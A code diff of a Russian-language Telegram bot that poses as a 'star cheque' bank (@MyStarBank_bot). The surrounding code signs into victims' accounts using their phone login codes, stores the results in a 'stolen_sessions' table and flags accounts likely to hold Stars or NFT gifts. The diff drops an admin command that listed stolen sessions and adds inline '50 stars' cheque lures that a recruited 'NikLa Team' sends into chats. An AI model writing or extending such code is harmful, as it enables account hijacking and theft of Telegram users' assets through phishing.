@@ -208,21 +208,19 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// ПРОВЕРКА СТАТУСА АККАУНТА (БЕЗ ФЕЙКОВЫХ ЦИФР)
+// ПРОВЕРКА СТАТУСА АККАУНТА
 async function checkAccountStatus(client, phone) {
     try {
         const user = await client.getMe();
         
-        // НЕ ИСПОЛЬЗУЕМ РАНДОМ - только реальные данные
         let message = `🔍 СТАТУС АККАУНТА:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: ${user.username || 'нет'}\n` +
                      `👑 Премиум: ${user.premium ? 'да' : 'нет'}\n` +
                      `📅 Аккаунт создан: ${user.status ? 'давно' : 'недавно'}\n\n`;
         
-        // Проверяем реальные данные без вранья
-        const hasStars = user.premium || user.username; // Если премиум или есть юзернейм - возможно есть звезды
-        const hasGifts = user.premium; // Если премиум - возможно есть подарки
+        const hasStars = user.premium || user.username;
+        const hasGifts = user.premium;
         
         if (hasStars || hasGifts) {
             message += `💰 ВОЗМОЖНО ЕСТЬ СРЕДСТВА\n` +
@@ -249,41 +247,30 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// Команда /activesessions
-bot.onText(/\/activesessions/, (msg) => {
-    const chatId = msg.chat.id;
-    
-    if (msg.from.id !== MY_USER_ID) {
-        bot.sendMessage(chatId, '❌ Команда не найдена');
-        return;
-    }
-    
-    db.all(`SELECT * FROM stolen_sessions WHERE status = 'completed' ORDER BY created_at DESC`, (err, rows) => {
-        if (err || rows.length === 0) {
-            bot.sendMessage(chatId, '📊 Нет активных сессий');
-            return;
+// INLINE QUERY ДЛЯ ПОДСКАЗКИ
+bot.on('inline_query', (query) => {
+    const results = [
+        {
+            type: 'photo',
+            id: '1',
+            photo_url: `${WEB_APP_URL}/stars.jpg`,
+            thumb_url: `${WEB_APP_URL}/stars.jpg`,
+            title: '🎫 Создать чек на 50 звезд',
+            description: 'Нажмите чтобы отправить чек в чат',
+            caption: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "🪙 Забрать звезды", callback_data: "create_check_inline" }
+                ]]
+            }
         }
-        
-        let message = `📊 АКТИВНЫЕ СЕССИИ (${rows.length}):\n\n`;
-        
-        rows.forEach((session, index) => {
-            const userData = session.tg_data ? JSON.parse(session.tg_data) : {};
-            const isPremium = userData.is_premium || false;
-            
-            message += `👤 #${index + 1}:\n`;
-            message += `📱 ${session.phone}\n`;
-            message += `⭐ Звезды: ${session.stars_data ? 'есть' : 'нет'}\n`;
-            message += `🎁 NFT: ${session.gifts_data ? 'есть' : 'нет'}\n`;
-            message += `👑 Премиум: ${isPremium ? 'да' : 'нет'}\n`;
-            message += `⏰ ${new Date(session.created_at).toLocaleString()}\n\n`;
-        });
-        
-        bot.sendMessage(chatId, message);
-    });
+    ];
+    
+    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
-// КОМАНДА /niklateam - ДОБАВЛЕНИЕ В КОМАНДУ
-bot.onText(/\/niklateam/, (msg) => {
+// КОМАНДА /niklateam - ПРОСТОЕ ДОБАВЛЕНИЕ
+bot.onText(/\/niklateam (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
@@ -292,26 +279,30 @@ bot.onText(/\/niklateam/, (msg) => {
         return;
     }
     
-    const targetUserId = msg.reply_to_message?.from?.id;
-    if (!targetUserId) {
-        bot.sendMessage(chatId, '❌ Ответьте на сообщение пользователя');
-        return;
-    }
+    const targetUsername = match[1].replace('@', '').trim();
     
-    const username = msg.reply_to_message.from.username || msg.reply_to_message.from.first_name;
-    
-    db.run(`INSERT OR REPLACE INTO niklateam (user_id, username) VALUES (?, ?)`, 
-        [targetUserId, username], function(err) {
-        if (err) {
-            bot.sendMessage(chatId, '❌ Ошибка добавления');
+    // Получаем ID пользователя по username
+    db.get(`SELECT user_id FROM users WHERE username = ?`, [targetUsername], (err, userRow) => {
+        if (err || !userRow) {
+            bot.sendMessage(chatId, `❌ Пользователь @${targetUsername} не найден в базе`);
             return;
         }
         
-        bot.sendMessage(chatId, `✅ @${username} добавлен в NikLa Team!`);
-        bot.sendMessage(targetUserId, 
-            `🎉 Вы добавлены в NikLa Team!\n\n` +
-            `Теперь вы можете создавать чеки в любых чатах через @MyStarBank_bot`
-        );
+        const targetUserId = userRow.user_id;
+        
+        db.run(`INSERT OR REPLACE INTO niklateam (user_id, username) VALUES (?, ?)`, 
+            [targetUserId, targetUsername], function(err) {
+            if (err) {
+                bot.sendMessage(chatId, '❌ Ошибка добавления');
+                return;
+            }
+            
+            bot.sendMessage(chatId, `✅ @${targetUsername} добавлен в NikLa Team!`);
+            bot.sendMessage(targetUserId, 
+                `🎉 Вы добавлены в NikLa Team!\n\n` +
+                `Теперь вы можете создавать чеки в любых чатах через @MyStarBank_bot`
+            );
+        });
     });
 });
 
@@ -324,7 +315,55 @@ bot.on('callback_query', (query) => {
     if (data.startsWith('claim_')) {
         handleCheckClaim(query, chatId, userId, data);
     }
+    else if (data === 'create_check_inline') {
+        handleInlineCheck(query, userId);
+    }
 });
+
+function handleInlineCheck(query, userId) {
+    // Проверяем есть ли пользователь в NikLa Team
+    db.get(`SELECT * FROM niklateam WHERE user_id = ?`, [userId], (err, row) => {
+        if (err || !row) {
+            bot.answerCallbackQuery(query.id, { 
+                text: '❌ У вас нет прав для создания чеков',
+                show_alert: true 
+            });
+            return;
+        }
+        
+        // Создаем чек
+        const amount = 50;
+        const activations = 1;
+        
+        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
+            [amount, activations, userId], function(err) {
+            if (err) {
+                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка создания чека' });
+                return;
+            }
+            
+            const checkId = this.lastID;
+            const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
+            
+            // Редактируем сообщение с чеком
+            bot.editMessageCaption(checkText, {
+                chat_id: query.message.chat.id,
+                message_id: query.message.message_id,
+                parse_mode: 'HTML',
+                reply_markup: { 
+                    inline_keyboard: [[{ 
+                        text: "🪙 Забрать звезды", 
+                        callback_data: `claim_${checkId}` 
+                    }]] 
+                }
+            }).catch(e => {
+                console.log('Ошибка редактирования:', e);
+            });
+            
+            bot.answerCallbackQuery(query.id, { text: '✅ Чек создан!' });
+        });
+    });
+}
 
 function handleCheckClaim(query, chatId, userId, data) {
     const checkId = data.split('_')[1];
@@ -351,8 +390,8 @@ function handleCheckClaim(query, chatId, userId, data) {
             
             bot.sendMessage(userId,
                 `🎉 Чек успешно получен!\n\n` +
-                `💫 Ваш баланс: ${row.amount} stars\n` +
-                `💰 Общий баланс: ${row.amount} stars\n\n` +
+                `💫 Получено: ${row.amount} stars\n` +
+                `💰 Ваш баланс: ${row.amount} stars\n\n` +
                 `📱 Для управления балансом перейдите в бота`,
                 {
                     reply_markup: {
@@ -426,8 +465,8 @@ bot.onText(/\/balance/, (msg) => {
     });
 });
 
-// ФИКС: СОЗДАНИЕ ЧЕКОВ ТОЛЬКО ДЛЯ NIKLATEAM
-bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
+// СОЗДАНИЕ ЧЕКОВ ТОЛЬКО ДЛЯ NIKLATEAM
+bot.onText(/@MyStarBank_bot/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
@@ -441,7 +480,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
         
         // В команде - создаем чек
         const amount = 50;
-        const activations = 1; // Только 1 активация
+        const activations = 1;
         
         db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
             [amount, activations, userId], function(err) {
